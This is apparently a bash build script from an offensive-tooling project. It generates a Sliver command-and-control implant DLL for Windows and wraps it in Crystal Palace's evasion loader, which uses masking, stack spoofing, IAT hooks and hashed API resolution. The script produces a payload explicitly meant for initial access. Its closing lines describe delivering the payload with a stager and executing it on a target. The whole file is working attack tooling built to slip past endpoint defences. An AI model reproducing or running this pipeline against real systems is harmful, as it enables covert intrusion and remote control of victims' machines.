#!/usr/bin/env bash
#
# generate-implant.sh — wrap a Sliver implant DLL through Crystal Palace's main
# loader. Produces a hardened PICO that can be delivered as initial access.
#
# This is the PRIMARY use case of crystal-kit-sliver:
#   replace Sliver's default reflective loader with Crystal Palace's
#   evasion stack (mask + spoof + IAT hooks + ror13 API resolution).
#
# Required env:
#   CRYSTAL_PALACE_HOME  Crystal Palace dist/ dir (with crystalpalace.jar + link)
#   SLIVER_SERVER        Path to sliver-server binary (only for --profile mode)
#
# Modes:
#   ./generate-implant.sh --profile <profile-name> [output.bin]
#       Generates a fresh implant DLL via sliver-server then wraps it.
#
#   ./generate-implant.sh --dll <path-to-dll> [output.bin]
#       Wraps an existing DLL (useful for testing without Sliver, or for
#       wrapping any third-party Windows DLL meant to be position-independent).
#
# Verified CLI of the underlying linker:
#   ./link <loader.spec> <file.dll|file.o> <out.bin> [%KEY=value]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
[[ -f "$SCRIPT_DIR/.crystalenv" ]] && source "$SCRIPT_DIR/.crystalenv"

: "${CRYSTAL_PALACE_HOME:?Set CRYSTAL_PALACE_HOME or create sliver-glue/.crystalenv with CRYSTAL_PALACE_HOME=<path>}"

usage() {
    cat <<EOF
Usage:
  $0 --profile <sliver-profile-name> [output.bin]
  $0 --dll     <path-to-dll>         [output.bin]
EOF
    exit 2
}

MODE=""
ARG=""
OUTPUT="./build/crystal-implant.x64.bin"

if [[ $# -lt 2 ]]; then usage; fi

case "$1" in
    --profile) MODE="profile"; ARG="$2";;
    --dll)     MODE="dll";     ARG="$2";;
    *) usage;;
esac

[[ $# -ge 3 ]] && OUTPUT="$3"

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LOADER_DIR="$REPO_ROOT/loader"
BUILD_DIR="$(dirname "$OUTPUT")"
mkdir -p "$BUILD_DIR"

OUTPUT="$(cd "$BUILD_DIR" && pwd)/$(basename "$OUTPUT")"

if [[ "$MODE" == "profile" ]]; then
    : "${SLIVER_SERVER:=sliver-server}"
    IMPLANT_DLL="$(cd "$BUILD_DIR" && pwd)/${ARG}.dll"
    echo "[*] Generating Sliver implant DLL from profile: $ARG"
    "$SLIVER_SERVER" generate \
        --profile "$ARG" \
        --format shared \
        --os windows --arch amd64 \
        --save "$IMPLANT_DLL"
else
    IMPLANT_DLL="$(cd "$(dirname "$ARG")" && pwd)/$(basename "$ARG")"
    if [[ ! -f "$IMPLANT_DLL" ]]; then
        echo "error: DLL not found: $IMPLANT_DLL" >&2
        exit 2
    fi
    echo "[*] Using pre-built DLL: $IMPLANT_DLL"
fi

if [[ ! -x "$CRYSTAL_PALACE_HOME/link" ]]; then
    echo "error: 'link' wrapper not executable at $CRYSTAL_PALACE_HOME/link" >&2
    exit 2
fi

if [[ ! -f "$REPO_ROOT/libtcg.x64.zip" ]]; then
    echo "error: libtcg.x64.zip missing at $REPO_ROOT/libtcg.x64.zip" >&2
    exit 2
fi

echo "[*] Building loader objects"
make -C "$LOADER_DIR" all

echo "[*] Running Crystal Palace linker on loader/loader.spec"
cd "$LOADER_DIR"
"$CRYSTAL_PALACE_HOME/link" \
    loader.spec \
    "$IMPLANT_DLL" \
    "$OUTPUT"

echo "[+] Crystal-wrapped implant PICO at: $OUTPUT"
echo "[i] Deliver this PICO together with a stager (e.g. run.x64.exe from the"
echo "    Crystal Palace demo/) to the target. Execute on target with:"
echo "       run.x64.exe $(basename "$OUTPUT")"
